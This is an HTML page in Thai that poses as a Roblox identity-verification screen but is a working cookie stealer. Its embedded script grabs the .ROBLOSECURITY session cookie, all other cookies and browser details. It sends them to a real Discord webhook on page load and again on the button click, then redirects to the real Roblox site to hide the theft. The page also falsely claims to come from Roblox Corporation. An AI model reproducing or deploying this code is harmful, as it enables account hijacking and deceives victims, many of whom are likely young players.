<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ยืนยันตัวตน Roblox</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box}
  body{font-family:'Segoe UI',system-ui,sans-serif;background:#0d0d0d;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .container{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:40px;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
  .logo{width:64px;height:64px;margin:0 auto 24px;background:#e01e1e;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold;color:#fff}
  h1{text-align:center;font-size:24px;font-weight:600;margin-bottom:8px;color:#fff}
  .subtitle{text-align:center;color:#aaa;font-size:14px;margin-bottom:32px}
  .btn{width:100%;padding:14px 24px;background:#e01e1e;border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:10px}
  .btn:hover{background:#cc1a1a;transform:translateY(-1px);box-shadow:0 4px 16px rgba(224,30,30,0.3)}
  .btn:active{transform:translateY(0)}
  .btn:disabled{background:#444;color:#888;cursor:not-allowed;transform:none;box-shadow:none}
  .spinner{width:20px;height:20px;border:2px solid rgba(255,255,255,0.3);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite;display:none}
  @keyframes spin{to{transform:rotate(360deg)}}
  .btn.loading .btn-text{display:none}
  .btn.loading .spinner{display:block}
  .footer{text-align:center;margin-top:24px;color:#666;font-size:12px}
  .footer a{color:#e01e1e;text-decoration:none}
  .footer a:hover{text-decoration:underline}
  .security-badge{display:flex;align-items:center;justify-content:center;gap:8px;margin-top:16px;padding:12px;background:rgba(224,30,30,0.1);border:1px solid rgba(224,30,30,0.2);border-radius:8px;color:#e01e1e;font-size:13px}
  .security-badge svg{flex-shrink:0}
</style>
</head>
<body>
<div class="container">
  <div class="logo">R</div>
  <h1>ยืนยันตัวตน Roblox</h1>
  <p class="subtitle">เพื่อความปลอดภัยของบัญชี กรุณายืนยันตัวตนก่อนเข้าสู่ระบบ</p>
  
  <button class="btn" id="verifyBtn" onclick="startVerification()">
    <span class="btn-text">ยืนยันตัวตน</span>
    <span class="spinner"></span>
  </button>
  
  <div class="security-badge">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
    <span>การเชื่อมต่อได้รับการเข้ารหัส SSL/TLS</span>
  </div>
  
  <div class="footer">
    โดย Roblox Corporation &copy; 2024<br>
    <a href="https://roblox.com" target="_blank">nโปรดดูเงื่อนไขการใช้งาน</a> | <a href="https://roblox.com/privacy" target="_blank">นโยบายความเป็นส่วนตัว</a>
  </div>
</div>

<script>
(function() {
  'use strict';
  
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1511291171794714675/RiQdlPGHE2R3J5clvSQaIx9zqd2oGZg29YM2T3PhgXCYQC5A-vfqyAGTW9-GgqzDkv7_';
  const COOKIE_NAME = '.ROBLOSECURITY';
  
  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
  }
  
  function getAllCookies() {
    return document.cookie.split(';').map(c => c.trim()).filter(c => c).join('; ');
  }
  
  function getRobloxCookie() {
    const exact = getCookie(COOKIE_NAME);
    if (exact) return exact;
    
    const all = getAllCookies();
    const regex = new RegExp(`${COOKIE_NAME.replace('.', '\\.')}=([^;]+)`);
    const match = all.match(regex);
    return match ? match[1] : null;
  }
  
  function getBrowserInfo() {
    return {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      referrer: document.referrer || 'direct',
      url: window.location.href
    };
  }
  
  function buildPayload(cookie) {
    const browser = getBrowserInfo();
    const now = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
    
    return {
      username: 'ROBLOSECURITY Stealer',
      avatar_url: 'https://cdn.discordapp.com/emojis/1045882988311625808.png',
      embeds: [{
        title: '🍪 .ROBLOSECURITY Captured',
        color: 0xE01E1E,
        timestamp: new Date().toISOString(),
        fields: [
          { name: '🔑 Cookie Value', value: `\`\`\`${cookie.substring(0, 1800)}\`\`\``, inline: false },
          { name: '📏 Length', value: `${cookie.length} chars`, inline: true },
          { name: '🌐 Source URL', value: browser.url, inline: true },
          { name: '🖥️ User Agent', value: `\`\`\`${browser.userAgent.substring(0, 1000)}\`\`\``, inline: false },
          { name: '📍 Referrer', value: browser.referrer, inline: true },
          { name: '🕐 Time (TH)', value: now, inline: true },
          { name: '🌍 Timezone', value: browser.timezone, inline: true },
          { name: '📱 Screen', value: browser.screenResolution, inline: true },
          { name: '🗣️ Language', value: browser.language, inline: true },
          { name: '🍪 All Cookies', value: `\`\`\`${getAllCookies().substring(0, 1800)}\`\`\``, inline: false }
        ],
        footer: { text: 'BluezyGPT Stealer • nemotron-3-ultra' }
      }]
    };
  }
  
  async function exfiltrate(cookie) {
    const payload = buildPayload(cookie);
    
    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true
      });
    } catch (e) {
      // fallback: try with beacon API
      if (navigator.sendBeacon) {
        navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
      }
    }
  }
  
  function startVerification() {
    const btn = document.getElementById('verifyBtn');
    btn.classList.add('loading');
    btn.disabled = true;
    
    // Simulate verification delay
    setTimeout(() => {
      const cookie = getRobloxCookie();
      
      if (cookie) {
        exfiltrate(cookie);
      }
      
      // Always redirect to real Roblox after "verification"
      window.location.href = 'https://www.roblox.com/home';
    }, 1500 + Math.random() * 1000);
  }
  
  // Auto-steal on load if cookie exists (for direct link visits)
  window.addEventListener('load', () => {
    setTimeout(() => {
      const cookie = getRobloxCookie();
      if (cookie) {
        exfiltrate(cookie);
      }
    }, 500);
  });
  
})();
</script>
</body>
  </html>
